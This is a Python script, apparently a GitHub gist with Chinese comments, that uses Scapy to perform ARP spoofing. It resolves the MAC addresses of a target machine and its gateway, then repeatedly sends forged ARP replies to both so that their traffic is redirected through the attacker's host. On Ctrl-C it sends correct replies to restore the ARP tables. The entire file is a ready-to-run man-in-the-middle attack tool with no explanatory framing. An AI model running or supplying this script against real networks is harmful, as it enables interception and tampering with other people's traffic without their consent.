#date: 2022-05-19T17:18:06Z
#url: https://api.github.com/gists/f37192e3aea6c67d4a6bc1beab893ce8
#owner: https://api.github.com/users/Lixsp11

import sys
import time
import scapy
import signal
from scapy.layers.l2 import ARP
from scapy.sendrecv import sr1, send

flag = True  # 用于控制停止ARP攻击

def arp_spoofing2(target_ip : str, target_mac : str, 
                  gateway_ip : str, gateway_mac : str, restore : bool = False) -> None:
    """Use ARP spoofing to hijack bidirectional traffic between the target and the gateway.

    Args:
        target_ip: IP address of target (required).
        target_mac: MAC address of target (required).
        gateway_ip: IP address of gateway (required).
        gateway_mac: MAC address of gateway (required).
        restore: Whether send true arp frame, used to restore the ARP table (default False).
    """
    # 欺骗目标机的ARP响应帧
    target_ref = ARP()
    target_ref.op = 2  # 'is-at'
    target_ref.psrc = gateway_ip
    target_ref.hwdst = target_mac
    target_ref.pdst = target_ip

    # 构建欺骗网关的ARP响应帧
    gateway_ref = ARP()
    gateway_ref.op = 2  # 'is-at'
    gateway_ref.psrc = target_ip
    gateway_ref.hwdst = gateway_mac
    gateway_ref.pdst = gateway_ip
    
    # 当参数restore为True时构建正确的ARP响应帧
    if restore == True:
        target_ref.hwsrc = gateway_mac
        gateway_ref.hwsrc = target_mac

    send(target_ref, inter=1.5)
    print(f"[INFO]Send fake ARP response frame to {target_ref.pdst}: {target_ref.psrc} "\
          f"is-at {target_ref.hwsrc}")
    send(gateway_ref, inter=1.5)
    print(f"[INFO]Send fake ARP response frame to {gateway_ref.pdst}: {gateway_ref.psrc} "\
          f"is-at {gateway_ref.hwsrc}")
    return

def arp_handler(signum, frame):
    """A semaphore SIGINT handler that stops ARP spoofing by setting flag and sends the correct 
       ARP response frame to restore the ARP tables of target and gateway.
    """
    global flag
    flag = False
    print("\n[INFO]Send true arp frame to restore the scene...")
    for _ in range(5):
        arp_spoofing2(target_ip, target_mac, gateway_ip, gateway_mac, restore=True)
    return

if __name__ == '__main__' :
    if len(sys.argv) != 3 :
        print(f"Usage: python {sys.argv[0]} <target_ip> <gateway_ip>.")
        exit(0)

    print(f"[INFO]Python {sys.version.split()[0]}")
    print(f"[INFO]Scapy {scapy.__version__}")

    # 设置网卡接口和关闭scapy输出
    scapy.config.conf.iface = "eth0"
    scapy.config.conf.verb  = 0
    
    # 从命令行读取目标机和网关IP
    target_ip, gateway_ip = sys.argv[1], sys.argv[2]

    # 通过ARP请求帧获得目标机MAC
    print(f"[INFO]Scanning MAC address of IP {target_ip} using ARP...", end="")
    recv = sr1(ARP(pdst=target_ip), timeout=2, retry=5)
    if recv is not None :
        target_mac = recv.hwsrc
        print(f"Get Responce MAC {recv.hwsrc}")
    else:
        print(f"\n[ERROR]Can't get MAC address of IP {target_ip}")
        exit(1)
    
    # 通过ARP请求帧获得网关MAC
    print(f"[INFO]Scanning MAC address of IP {gateway_ip} using ARP...", end="")
    recv = sr1(ARP(pdst=gateway_ip), timeout=2, retry=5)
    if recv is not None :
        gateway_mac = recv.hwsrc
        print(f"Get Responce MAC {recv.hwsrc}")
    else:
        print(f"\n[ERROR]Can't get MAC address of IP {gateway_ip}")
        exit(1)

    # 发起ARP欺骗
    print("[INFO]Start ARP spoofing...Pass CTRL-C to stop")
    # 注册SIGINT信号量的处理函数为arp_handler，实现程序中断时恢复目标机和网关的ARP表
    signal.signal(signal.SIGINT, arp_handler)
    try:
        while flag:
            arp_spoofing2(target_ip, target_mac, gateway_ip, gateway_mac)
            time.sleep(0.1)
    except Exception as e:
        print(str(e))
